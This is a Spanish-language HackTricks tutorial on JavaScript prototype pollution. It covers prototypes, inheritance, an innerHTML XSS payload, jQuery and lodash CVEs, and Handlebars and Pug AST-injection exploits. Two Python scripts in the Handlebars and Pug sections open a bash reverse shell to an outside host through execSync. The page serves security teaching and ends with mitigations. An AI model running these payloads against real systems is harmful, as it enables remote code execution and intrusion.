# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme en** **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Objetos en JavaScript <a href="#053a" id="053a"></a>

En primer lugar, necesitamos entender `Object` en JavaScript. Un objeto es simplemente una colecci√≥n de pares clave-valor, a menudo llamados propiedades de ese objeto. Por ejemplo:

![](<../../../.gitbook/assets/image (389) (1).png>)

En JavaScript, `Object` es un objeto b√°sico, la plantilla para todos los objetos reci√©n creados. Es posible crear un objeto vac√≠o pasando `null` a `Object.create`. Sin embargo, el objeto reci√©n creado tambi√©n tendr√° un tipo que corresponde al par√°metro pasado y heredar√° todas las propiedades b√°sicas.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Anteriormente aprendimos que un Objeto en javascript es una colecci√≥n de claves y valores, por lo que tiene sentido que un objeto `null` sea simplemente un diccionario vac√≠o: `{}`

## Funciones / Clases en Javascript <a href="#55dd" id="55dd"></a>

En Javascript, los conceptos de la clase y la funci√≥n est√°n bastante interrelacionados (la funci√≥n en s√≠ act√∫a como el constructor de la clase y la naturaleza real no tiene concepto de "clase" en javascript). Veamos el siguiente ejemplo:
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## Prototipos en JavaScript <a href="#3843" id="3843"></a>

Una cosa a tener en cuenta es que el atributo prototype puede ser cambiado/modificado/eliminado al ejecutar el c√≥digo. Por ejemplo, las funciones de la clase pueden ser a√±adidas din√°micamente:

![](<../../../.gitbook/assets/image (363).png>)

Las funciones de la clase tambi√©n pueden ser modificadas (como `toString` o `valueOf` en los siguientes casos):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## Herencia

En un programa basado en prototipos, los objetos heredan propiedades/m√©todos de las clases. Las clases se derivan a√±adiendo propiedades/m√©todos a una instancia de otra clase o a√±adi√©ndolos a un objeto vac√≠o.

Ten en cuenta que, si a√±ades una propiedad a un objeto que se utiliza como prototipo para un conjunto de objetos (como el myPersonObj), los objetos para los que es el prototipo tambi√©n obtienen la nueva propiedad, pero esa propiedad no se imprime a menos que se llame espec√≠ficamente.

![](<../../../.gitbook/assets/image (366).png>)

## Contaminaci√≥n de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

Ya deber√≠as haber aprendido que **cada objeto en JavaScript es simplemente una colecci√≥n de pares clave y valor** y que **cada objeto hereda del tipo Object en JavaScript**. Esto significa que si eres capaz de contaminar el tipo Object **¬°cada objeto JavaScript del entorno ser√° contaminado!**

Esto es bastante simple, solo necesitas ser capaz de modificar algunas propiedades (pares clave-valor) de un objeto JavaScript arbitrario, porque como cada objeto hereda de Object, cada objeto puede acceder al esquema de Object.
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
A partir del ejemplo anterior, es posible acceder a la estructura del objeto utilizando las siguientes formas:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Entonces, como se mencion√≥ anteriormente, si ahora se agrega una propiedad al esquema del objeto, todos los objetos de JavaScript tendr√°n acceso a la nueva propiedad:
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
Entonces, cada objeto JS contendr√° las nuevas propiedades: la funci√≥n `printHello` y la nueva constante `globalconstant`

## contaminaci√≥n de prototipos

Esta t√©cnica no es tan efectiva como la anterior ya que no puedes contaminar el esquema de un objeto JS. Pero en casos donde la **palabra clave `__proto__` est√° prohibida, esta t√©cnica puede ser √∫til**.

Si puedes modificar las propiedades de una funci√≥n, puedes modificar la propiedad `prototype` de la funci√≥n y **cada nueva propiedad que agregues aqu√≠ ser√° heredada por cada objeto creado a partir de esa funci√≥n:**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
En este caso solo se ver√°n afectados los **objetos creados a partir de la clase `person`**, pero cada uno de ellos ahora **heredar√° las propiedades `sayHello` y `newConstant`**.

**Hay 2 formas de abusar de la contaminaci√≥n de prototipos para envenenar CADA objeto JS.**

La primera ser√≠a contaminar el prototipo de la propiedad de **Object** (como se mencion√≥ anteriormente, todos los objetos JS heredan de este):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Si logras hacer eso, cada objeto JS podr√° ejecutar la funci√≥n `sayBye`.

Otra forma es envenenar el prototipo de un constructor de una variable de diccionario como en el siguiente ejemplo:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Despu√©s de ejecutar ese c√≥digo, **cada objeto JS podr√° ejecutar la funci√≥n `sayHey`**.

## Contaminando otros objetos

### De una clase a Object.prototype

En un escenario donde puedes **contaminar un objeto espec√≠fico** y necesitas **llegar a `Object.prototype`** puedes buscarlo con un c√≥digo similar al siguiente:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Contaminaci√≥n de elementos de un array

Ten en cuenta que al igual que puedes contaminar atributos de objetos en JS, si tienes acceso para contaminar un array tambi√©n puedes **contaminar los valores del array** accesibles **por √≠ndices** (nota que no puedes sobrescribir valores, por lo que necesitas contaminar √≠ndices que de alguna manera se utilicen pero no se escriban).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Contaminaci√≥n de elementos Html

Al generar un elemento HTML a trav√©s de JS, es posible **sobrescribir** el atributo **`innerHTML`** para hacer que escriba **c√≥digo HTML arbitrario**. [Idea y ejemplo de este informe](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Ejemplos

### Ejemplo B√°sico

Entonces, ¬ød√≥nde est√° la contaminaci√≥n del prototipo? Sucede cuando hay un error en la aplicaci√≥n que permite sobrescribir propiedades de `Object.prototype`. Dado que cada objeto t√≠pico hereda sus propiedades de `Object.prototype`, podemos cambiar el comportamiento de la aplicaci√≥n. El ejemplo m√°s com√∫nmente mostrado es el siguiente:
```javascript
if (user.isAdmin) {   // do something important!}
```
Imaginemos que tenemos una contaminaci√≥n de prototipos que hace posible establecer `Object.prototype.isAdmin = true`. ¬°Entonces, a menos que la aplicaci√≥n asigne expl√≠citamente alg√∫n valor, `user.isAdmin` siempre es verdadero!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

Por ejemplo, `obj[a][b] = value`. Si el atacante puede controlar el valor de `a` y `value`, entonces solo necesita ajustar el valor de `a` a `__proto__` (en JavaScript, `obj["__proto__"]` y `obj.__proto__` son completamente equivalentes) luego la propiedad `b` de todos los objetos existentes en la aplicaci√≥n se asignar√° a `value`.

Sin embargo, el ataque no es tan simple como el anterior, seg√∫n [documento](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), solo podemos atacar cuando se cumple una de las siguientes tres condiciones:

* Realizar una fusi√≥n recursiva
* Definici√≥n de propiedad por ruta
* Clonar objeto

### Anular funci√≥n
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Contaminaci√≥n de Prototipo a RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Contaminaci√≥n de Prototipo del lado del cliente a XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de contaminaci√≥n de prototipo a trav√©s de jQuery $ .extend

$ .extend, si se maneja incorrectamente, puede cambiar las propiedades del objeto `prototype` (la plantilla de los objetos en la aplicaci√≥n). Esta propiedad luego aparecer√° en todos los objetos. Tenga en cuenta que solo la versi√≥n "profunda" (es decir, g) de $ .extened se ve afectada.

Los programadores a menudo usan esta funci√≥n para duplicar un objeto o completar nuevas propiedades a partir de un objeto predeterminado. Por ejemplo:

Podemos imaginar que `myObject` es un campo de entrada del usuario y se serializa en la base de datos)

En este c√≥digo, a menudo pensamos que, al ejecutarlo, asignar√° el atributo `isAdmin` al objeto reci√©n creado. Pero esencialmente, se asigna directamente a `{}` y luego `{}.isAdmin` ser√° `true`. Si despu√©s de este c√≥digo, realizamos la siguiente verificaci√≥n:
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
Si el usuario a√∫n no ha existido (`undefined`), la propiedad `isAdmin` se buscar√° en su objeto padre, que es el objeto al que se le agreg√≥ `isAdmin` con el valor `true` arriba.

Otro ejemplo al ejecutarse en JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Estos errores pueden afectar a muchos proyectos de Javascript, especialmente a los proyectos de NodeJS, el ejemplo m√°s pr√°ctico es el error en Mongoose, la biblioteca JS que ayuda a manipular MongoDB, en diciembre de 2018.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de poluci√≥n de prototipos a trav√©s de lodash

[Lodash](https://www.npmjs.com/package/lodash) es tambi√©n una biblioteca conocida que proporciona muchas funciones diferentes, ayud√°ndonos a escribir c√≥digo de manera m√°s conveniente y ordenada con m√°s de 19 millones de descargas semanales. Y tuvo el mismo problema que JQuery.

**CVE-2018‚Äì3721**

**CVE-2019‚Äì10744**

Este error afecta a todas las versiones de Lodash, ya corregido en la versi√≥n 4.17.11.

### Otro tutorial con CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Poluci√≥n de prototipos AST en NodeJS

NodeJS utiliza extensamente √Årboles de Sintaxis Abstracta (AST) en JavaScript para funcionalidades como motores de plantillas y TypeScript. Esta secci√≥n explora las vulnerabilidades relacionadas con la poluci√≥n de prototipos en motores de plantillas, espec√≠ficamente Handlebars y Pug.

#### An√°lisis de Vulnerabilidad de Handlebars

El motor de plantillas Handlebars puede ser explotado para la poluci√≥n de prototipos. La vulnerabilidad se encuentra principalmente en las funciones `appendContent` y `pushSource` en el archivo `javascript-compiler.js`, donde `appendContent` concatena `pendingContent` si existe, y `pushSource` establece `pendingContent` en `undefined` despu√©s de empujar la fuente.

##### Proceso de Explotaci√≥n

La explotaci√≥n implica la manipulaci√≥n del AST generado por Handlebars. El proceso es el siguiente:

1. **Manipulaci√≥n del Analizador**: El analizador, a trav√©s del nodo `NumberLiteral`, fuerza que los valores sean n√∫meros. Sin embargo, esto puede ser eludido por la poluci√≥n de prototipos, permitiendo la inserci√≥n de cadenas no num√©ricas.
2. **Manejo del Compilador**: El compilador acepta un Objeto AST o una cadena de plantilla. Si `input.type` es `Program`, se considera que la entrada est√° preanalizada, lo que lleva a una posible explotaci√≥n.
3. **Inyecci√≥n de C√≥digo**: Al manipular `Object.prototype`, se puede inyectar c√≥digo arbitrario en la funci√≥n de plantilla, lo que lleva a una posible ejecuci√≥n remota de c√≥digo.

Ejemplo de explotaci√≥n de la vulnerabilidad de Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
El c√≥digo anterior demuestra c√≥mo un atacante puede inyectar c√≥digo arbitrario en una plantilla de Handlebars.

**Referencia Externa**: [Problema relacionado con la contaminaci√≥n del prototipo en la biblioteca 'flat'](https://github.com/hughsk/flat/issues/105)

Ejemplo de contaminaci√≥n del prototipo en Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Vulnerabilidad en Pug

Al igual que Handlebars, Pug tambi√©n puede ser explotado a trav√©s de la contaminaci√≥n de prototipos. M√°s informaci√≥n se puede encontrar en [Inyecci√≥n AST en Pug](https://blog.p6.is/AST-Injection/#Pug).

Ejemplo de contaminaci√≥n de prototipos en Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Medidas Preventivas

Para mitigar el riesgo de la contaminaci√≥n de prototipos, considere las siguientes estrategias:

1. **Inmutabilidad de Objetos**: Utilice `Object.freeze` para hacer que `Object.prototype` sea inmutable.
2. **Validaci√≥n de Entradas**: Valide estrictamente las entradas JSON basadas en el esquema de la aplicaci√≥n.
3. **Funciones de Fusi√≥n Seguras**: Evite el uso inseguro de funciones de fusi√≥n recursivas.
4. **Objetos sin Prototipo**: Utilice `Object.create(null)` para crear objetos sin propiedades de prototipo.
5. **Uso de Mapa**: Opte por `Map` en lugar de `Object` para pares clave-valor.
6. **Actualizaciones de Bibliotecas**: Actualice regularmente las bibliotecas para incorporar parches de seguridad.



## Referencias

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
